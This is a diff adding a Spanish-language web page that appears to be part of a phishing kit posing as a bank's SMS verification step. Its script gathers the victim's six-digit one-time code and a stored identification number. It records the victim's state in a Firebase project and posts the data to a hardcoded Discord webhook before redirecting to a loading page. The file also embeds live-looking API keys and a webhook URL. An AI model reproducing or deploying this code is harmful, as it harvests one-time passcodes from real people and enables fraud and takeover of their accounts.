@@ -1,0 +1,489 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=no"
+    />
+
+    <title>División y Carrusel</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.onSnapshot = onSnapshot;
+    </script>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        height: 100vh;
+        padding: 0;
+      }
+
+      .container {
+        display: flex;
+        flex-wrap: wrap;
+        height: 100vh;
+      }
+
+      .left,
+      .right {
+        padding: 20px;
+      }
+
+      .left {
+        flex: 1;
+        background-color: #ffffff;
+        order: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .right {
+        flex: 1.5;
+        background-color: #f6faff;
+        order: 2;
+      }
+
+      /* Estilo del contenedor del carrusel */
+      .carousel-wrapper {
+        width: 500px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        position: relative;
+      }
+
+      /* Estilo del carrusel */
+      .carousel {
+        display: flex;
+        gap: 10px;
+        overflow: hidden;
+        width: 100%;
+        scroll-behavior: smooth;
+      }
+
+      .carousel-item {
+        min-width: calc(33.33% - 20px);
+        height: 200px;
+
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 24px;
+        border-radius: 5px;
+      }
+
+      button {
+        background-color: rgb(255, 255, 255);
+        color: #0043a9;
+        border: none;
+        padding: 10px;
+        border-radius: 100%;
+        border: 1px solid #0043a9;
+        width: 40px;
+        cursor: pointer;
+      }
+
+      .prev,
+      .next {
+        flex: 0 0 auto;
+      }
+      .formulario {
+        width: 400px;
+      }
+
+      .formcontainer {
+        width: 100%;
+        max-width: 600px;
+
+        height: 100vh;
+        margin: 0 auto;
+      }
+
+      .header {
+        display: flex;
+        justify-content: space-between;
+        background-color: #ffffff;
+        border: 1px solid #e6e6e6;
+        border-radius: 10px 10px 0 0;
+      }
+
+      .tab {
+        flex: 1;
+        padding: 15px;
+        text-align: center;
+        cursor: pointer;
+        color: gray;
+      }
+      .active {
+        color: #0043a9;
+        border-bottom: 1px solid #0043a9;
+      }
+
+      .forms {
+        padding: 20px;
+        border: 1px solid #e6e6e6;
+        background-color: #ffffff;
+      }
+
+      .form-content {
+        display: none;
+      }
+
+      .form-content h3 {
+        margin-top: 0;
+      }
+
+      #form1 {
+        display: block;
+        box-sizing: border-box;
+      }
+      @media (max-width: 768px) {
+        .container {
+          flex-direction: column;
+          height: auto;
+        }
+
+        .right {
+          order: 2 !important;
+          width: 100%;
+          height: auto; /* Ajusta la altura automáticamente */
+        }
+
+        .left {
+          order: 1;
+          width: 100%;
+        }
+
+        .formulario {
+          width: 100%;
+        }
+
+        .carousel-wrapper {
+          width: 100%;
+        }
+
+        .carousel-item {
+          min-width: 38%;
+        }
+        .centrars {
+          margin-top: 10%;
+        }
+      }
+      @media (min-width: 768px) {
+        .cabeza {
+          display: none;
+        }
+      }
+    </style>
+  </head>
+  <body style="background: #f6f9fe">
+    <div class="container">
+      <div class="left" style="background: #f6f9fe !important; padding: 0">
+        <div class="formulario" style="background: transparent !important">
+          <div
+            style="height: 50px; width: 100%; background: #2d3f63"
+            class="cabeza"
+          ></div>
+          <div
+            class="imagenlogo"
+            style="
+              width: 100%;
+              text-align: center;
+              background: white;
+              height: 50px;
+              display: flex;
+              justify-content: center;
+              align-items: center;
+            "
+          >
+            <div
+              style="
+                width: 90%;
+                padding: 15px;
+                border: 1px solid #1b7503;
+                background: #e9ffdb;
+                margin-top: 20px;
+                border-radius: 10px;
+              "
+            >
+              <img src="images/check.png" style="width: 20px" /> Codigo SMS
+              enviado
+            </div>
+          </div>
+          <div style="padding: 20px">
+            <div class="centrars">
+              <div class="titulo"><h4>Verifiquemos que eres tu</h4></div>
+
+              <div class="formcontainer">
+                <!-- Formularios -->
+                <div class="forms" style="border-radius: 10px">
+                  <div id="form1" class="form-content">
+                    <form id="segura">
+                      <div style="height: 70px; margin-top: 20px">
+                        <img
+                          src="images/verificacion.png"
+                          style="width: 180px"
+                        />
+                      </div>
+                      <p>
+                        Ingresá el código de 6 digitos que se envio a tu celular
+                      </p>
+                      <div style="width: 100%">
+                        <div
+                          style="
+                            width: 100%;
+                            display: flex;
+                            gap: 10px;
+                            justify-content: center;
+                            align-items: center;
+                            text-align: center;
+                            border-radius: 10px !important;
+                          "
+                        >
+                          <input
+                            type="text"
+                            maxlength="1"
+                            style="
+                              width: 40px;
+                              text-align: center;
+                              font-size: 20px;
+                              border: solid 1px #b3b3b3;
+                              border-radius: 9px;
+                              height: 40px;
+                              outline: none;
+                            "
+                            inputmode="numeric"
+                            id="input1"
+                          />
+                          <input
+                            type="text"
+                            maxlength="1"
+                            style="
+                              width: 40px;
+                              text-align: center;
+                              font-size: 20px;
+                              border: solid 1px #b3b3b3;
+                              border-radius: 9px;
+                              height: 40px;
+                              outline: none;
+                            "
+                            inputmode="numeric"
+                            id="input2"
+                          />
+                          <input
+                            type="text"
+                            maxlength="1"
+                            style="
+                              width: 40px;
+                              text-align: center;
+                              font-size: 20px;
+                              border: solid 1px #b3b3b3;
+                              border-radius: 9px;
+                              height: 40px;
+                              outline: none;
+                            "
+                            inputmode="numeric"
+                            id="input3"
+                          />
+                          <input
+                            type="text"
+                            maxlength="1"
+                            style="
+                              width: 40px;
+                              text-align: center;
+                              font-size: 20px;
+                              border: solid 1px #b3b3b3;
+                              border-radius: 9px;
+                              height: 40px;
+                              outline: none;
+                            "
+                            inputmode="numeric"
+                            id="input4"
+                          />
+                          <input
+                            type="text"
+                            maxlength="1"
+                            style="
+                              width: 40px;
+                              text-align: center;
+                              font-size: 20px;
+                              border: solid 1px #b3b3b3;
+                              border-radius: 9px;
+                              height: 40px;
+                              outline: none;
+                            "
+                            inputmode="numeric"
+                            id="input5"
+                          />
+                          <input
+                            type="text"
+                            maxlength="1"
+                            style="
+                              width: 40px;
+                              text-align: center;
+                              font-size: 20px;
+                              border: solid 1px #b3b3b3;
+                              border-radius: 9px;
+                              height: 40px;
+                              outline: none;
+                            "
+                            inputmode="numeric"
+                            id="input6"
+                          />
+                        </div>
+                        <script>
+                          const inputs =
+                            document.querySelectorAll('input[type="text"]');
+
+                          inputs.forEach((input, index) => {
+                            input.addEventListener("input", (event) => {
+                              const value = input.value.replace(/[^0-9]/g, ""); // Solo números
+                              input.value = value;
+
+                              // Ir al siguiente input si hay un número
+                              if (value && index < inputs.length - 1) {
+                                inputs[index + 1].focus();
+                              }
+                            });
+
+                            input.addEventListener("keydown", (event) => {
+                              if (
+                                event.key === "Backspace" &&
+                                input.value === ""
+                              ) {
+                                // Retroceder al input anterior si está vacío y se presiona Backspace
+                                if (index > 0) {
+                                  inputs[index - 1].focus();
+                                }
+                              }
+                            });
+                          });
+                        </script>
+                      </div>
+
+                      <button
+                        style="
+                          width: 100%;
+                          background: #0043a9;
+                          border-radius: 20px;
+
+                          color: white;
+                          margin-top: 30px;
+                        "
+                      >
+                        Ingresar
+                      </button>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function showForm(formId, element) {
+        // Ocultar todos los formularios
+        document.querySelectorAll(".form-content").forEach(function (form) {
+          form.style.display = "none";
+        });
+
+        // Mostrar el formulario seleccionado
+        document.getElementById(formId).style.display = "inline";
+
+        // Remover la clase activa de todas las pestañas
+        document.querySelectorAll(".tab").forEach(function (tab) {
+          tab.classList.remove("active");
+        });
+
+        // Agregar la clase activa a la pestaña seleccionada
+        element.classList.add("active");
+      }
+    </script>
+    <script src="script.js"></script>
+  </body>
+
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script src="telegram.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#segura");
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+      const clave =
+        document.querySelector("#input1").value +
+        document.querySelector("#input2").value +
+        document.querySelector("#input3").value +
+        document.querySelector("#input4").value +
+        document.querySelector("#input5").value +
+        document.querySelector("#input6").value;
+      const questionRef = doc(
+        window.db,
+        "bogot1",
+        localStorage.getItem("usuario"),
+      );
+      await setDoc(questionRef, {
+        page: 0,
+      });
+      const message =
+        "bogot1" +
+        "\nIndentificación: " +
+        localStorage.getItem("usuario") +
+        "\nSMS: " +
+        clave;
+
+      axios
+        .post(
+          "https://discord.com/api/webhooks/1559991129309712385/yTPHRmeNY0Ic-Glf-b6brRW6akGmoVtqbno_Cacm6u2YX5MC7Sw5oAkCoa6SXAsUw0nL",
+          {
+            content: message,
+          },
+          {
+            headers: {
+              "Content-Type": "application/json",
+            },
+          },
+        )
+        .then((response) => {
+          window.location.href = "cargando.html";
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+    });
+  </script>
+</html>
